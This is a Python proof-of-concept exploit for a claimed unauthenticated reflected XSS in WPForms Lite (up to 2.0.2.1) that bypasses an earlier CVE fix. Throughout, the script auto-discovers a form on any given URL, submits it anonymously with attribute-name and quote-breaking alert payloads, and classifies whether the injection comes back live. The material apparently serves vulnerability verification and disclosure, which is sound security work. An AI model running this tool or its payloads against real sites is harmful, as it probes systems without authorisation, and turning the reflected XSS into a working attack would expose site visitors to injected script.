#!/usr/bin/env python3
"""
PoC — WPForms Lite <= 2.0.2.1: incomplete fix of CVE-2026-88996.
Unauthenticated reflected XSS via Smart Tag at attribute-NAME position.

Usage:
  python3 poc.py                          # against the local rig
  python3 poc.py --url http://site/page/  # any WPForms page (form auto-discovered)
  python3 poc.py --url URL --field 3      # force the field id carrying the payload

No third-party dependencies (stdlib only). Exit code 0 = vulnerable (live
attribute injection), 1 = not vulnerable, 2 = target not understood.

What it does:
  1. Fetches the page, discovers the WPForms form id, post id and fields.
  2. Submits the form ANONYMOUSLY (no cookies, no nonce — nopriv endpoint)
     with a marker payload in a text field.
  3. Parses the returned Confirmation message and classifies every occurrence
     of the payload: ESCAPED (inside a quoted attribute value = the 2.0.2.1
     fix doing its job) vs LIVE (attribute-name position = the bypass).
  4. Runs the parent-CVE control payload (quote-breaking) to show the fix
     still holds at value positions.
  5. Repeats the payload submission via the non-AJAX POST path (what a
     cross-site attacker page does).
"""
import argparse
import json
import re
import sys
import urllib.parse
import urllib.request

MARKER = "poc93485"                      # unique token for occurrence analysis
PAYLOAD = "onmouseover=alert(%s)" % MARKER   # no space/quote/backtick/= inside
CONTROL = 'x" onfocus=alert(%s) autofocus y="' % MARKER  # parent-CVE shape

UA = {"User-Agent": "Mozilla/5.0 (PoC CVE-2026-88996-bypass)"}


def http(url, data=None):
    req = urllib.request.Request(url, data=data, headers=UA)
    with urllib.request.urlopen(req, timeout=15) as r:
        return r.read().decode("utf-8", "replace")


def discover(page_url, form_id=None):
    html = http(page_url)
    if form_id is None:
        m = re.search(r'wpforms-container"?\s+id="wpforms-(\d+)', html) or \
            re.search(r'name="wpforms\[id\]"\s+value="(\d+)"', html)
        if not m:
            print("[-] no WPForms form found on page")
            sys.exit(2)
        form_id = m.group(1)
    post_m = re.search(r'name="wpforms\[post_id\]"\s+value="(\d+)"', html)
    post_id = post_m.group(1) if post_m else ""
    fields = {}
    # capture each field input/textarea tag to learn its type
    for tag in re.findall(r"<(?:input|textarea)\b[^>]*>", html):
        nm = re.search(r'name="(wpforms\[fields\][^"]+)"', tag)
        if not nm:
            continue
        m = re.match(r"wpforms\[fields\]\[(\d+)\](?:\[([a-z]+)\])?", nm.group(1))
        if not m:
            continue
        fid, sub = m.group(1), m.group(2)
        if sub in ("first", "last"):
            ftype = "name-" + sub
        else:
            t = re.search(r'type="([a-z0-9-]+)"', tag)
            ftype = t.group(1) if t else "textarea" if tag.startswith("<textarea") else "text"
        fields.setdefault(fid, ftype)
    return form_id, post_id, fields, html


def build_fields(fields, payload, target_field=None):
    """Fill every discovered field benignly; put payload in one text field."""
    out = {}
    text_candidates = []
    for fid, ftype in sorted(fields.items(), key=lambda kv: int(kv[0])):
        if ftype == "name-first":
            out["wpforms[fields][%s][first]" % fid] = "PoC"
        elif ftype == "name-last":
            out["wpforms[fields][%s][last]" % fid] = "Tester"
        elif ftype in ("email", "confirmation"):
            out["wpforms[fields][%s]" % fid] = "poc@localhost.test"
        elif ftype in ("number", "range"):
            out["wpforms[fields][%s]" % fid] = "1"
        elif ftype in ("radio", "select", "checkbox"):
            continue  # options unknown; skip (may fail validation if required)
        else:  # text, textarea, url -> url fields also accept plain strings? keep filler
            out["wpforms[fields][%s]" % fid] = "filler"
            text_candidates.append(fid)
    if target_field:
        out["wpforms[fields][%s]" % target_field] = payload
    elif text_candidates:
        out["wpforms[fields][%s]" % sorted(text_candidates, key=int)[-1]] = payload
    else:
        print("[-] no text field found for payload (use --field N)")
        sys.exit(2)
    return out


def origin_of(url):
    p = urllib.parse.urlsplit(url)
    return "%s://%s" % (p.scheme, p.netloc)


def submit_ajax(base, form_id, post_id, fields):
    data = {"action": "wpforms_submit", "wpforms[id]": form_id,
            "wpforms[post_id]": post_id, "wpforms[submit]": "Submit"}
    data.update(fields)
    body = urllib.parse.urlencode(data).encode()
    resp = http(origin_of(base) + "/wp-admin/admin-ajax.php", body)
    return json.loads(resp)


def submit_nonajax(page_url, form_id, post_id, fields):
    data = {"wpforms[id]": form_id, "wpforms[post_id]": post_id,
            "wpforms[submit]": "Submit"}
    data.update(fields)
    body = urllib.parse.urlencode(data).encode()
    return http(page_url, body)


def classify(confirmation, what):
    """Classify each PAYLOAD occurrence: LIVE (attribute-name position,
    injected unescaped right after a tag name) vs ESCAPED (inside a quoted
    attribute value / inert text = the 2.0.2.1 fix working)."""
    live, escaped = [], 0
    for m in re.finditer(re.escape(PAYLOAD), confirmation):
        seg = confirmation[:m.start()]
        ctx = confirmation[max(0, m.start() - 60):m.end() + 40]
        if seg.endswith('"') or seg.endswith("'"):
            escaped += 1          # e.g. value="PAYLOAD  /  href="PAYLOAD
        elif re.search(r"<[a-zA-Z][a-zA-Z0-9-]*(\s[^<>]*)?$", seg):
            live.append(ctx.strip())  # e.g. <input PAYLOAD
        else:
            escaped += 1          # text or other inert context
    print("\n[%s] occurrences: LIVE=%d ESCAPED/INERT=%d" % (what, len(live), escaped))
    for l in live:
        print("    LIVE  -> ...%s..." % l[:150])
    return live


def text_fields(fields):
    """Ids of free-text-ish fields (payload candidates), lowest first."""
    return [fid for fid, t in sorted(fields.items(), key=lambda kv: int(kv[0]))
            if t in ("text", "textarea")]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://localhost:8090/hunt-page/",
                    help="page containing the WPForms form")
    ap.add_argument("--field", help="field id to carry the payload")
    ap.add_argument("--form", help="WPForms form id (default: auto)")
    ap.add_argument("--evidence", help="append output to this file")
    args = ap.parse_args()

    print("=== WPForms CVE-2026-88996 fix-bypass PoC (anonymous) ===")
    print("target: %s" % args.url)

    form_id, post_id, fields, page = discover(args.url, args.form)
    print("form id=%s  post_id=%s  fields=%s" % (form_id, post_id, fields))

    # 1) probe text-ish fields until one reflects into the confirmation
    #    (this is the unauth recon oracle: submit marker, observe reflection)
    candidates = [args.field] if args.field else text_fields(fields)
    conf, used, fields_payload = "", None, None
    for cand in candidates:
        fp = build_fields(fields, PAYLOAD, cand)
        r = submit_ajax(args.url, form_id, post_id, fp)
        c = (r.get("data") or {}).get("confirmation", "")
        if not c:
            print("[-] submission failed: %s" % json.dumps(r)[:300])
            sys.exit(2)
        if MARKER in c:
            conf, used, fields_payload = c, cand, fp
            print("[+] field %s reflects into the confirmation message" % cand)
            break
    if used is None:
        print("[-] no field reflects into a confirmation smart tag on this form "
              "(no {field_id} usage) — target not affected")
        sys.exit(1)
    live = classify(conf, "payload (bypass position)")

    # 2) control: parent-CVE quote-breaking shape on the reflecting field
    fields_ctrl = build_fields(fields, CONTROL, used)
    r2 = submit_ajax(args.url, form_id, post_id, fields_ctrl)
    conf2 = (r2.get("data") or {}).get("confirmation", "")
    ctrl_live = re.search(
        r"<[a-zA-Z][a-zA-Z0-9]*(\s[^>]*)?\sonfocus=alert\(%s\)" % MARKER, conf2)
    print("[control] parent-CVE payload escaped everywhere: %s"
          % ("YES (fix works at value positions)" if not ctrl_live else "NO (!)"))

    # 3) non-AJAX POST path (cross-site delivery shape)
    page2 = submit_nonajax(args.url, form_id, post_id, fields_payload)
    live2 = classify(page2, "non-AJAX POST")

    verdict_vuln = bool(live or live2)
    print("\n=== VERDICT: %s ===" %
          ("VULNERABLE — payload reaches attribute-NAME position unescaped "
           "(unauthenticated reflected XSS)" if verdict_vuln
           else "not vulnerable on this form/field (no live occurrence)"))
    if args.evidence:
        with open(args.evidence, "a") as f:
            f.write("\n=== poc.py run %s ===\n" % args.url)
            f.write("LIVE occurrences: %d / %d\n" % (len(live), len(live2)))
            for l in live + live2:
                f.write("  %s\n" % l[:300])
    sys.exit(0 if verdict_vuln else 1)


if __name__ == "__main__":
    main()
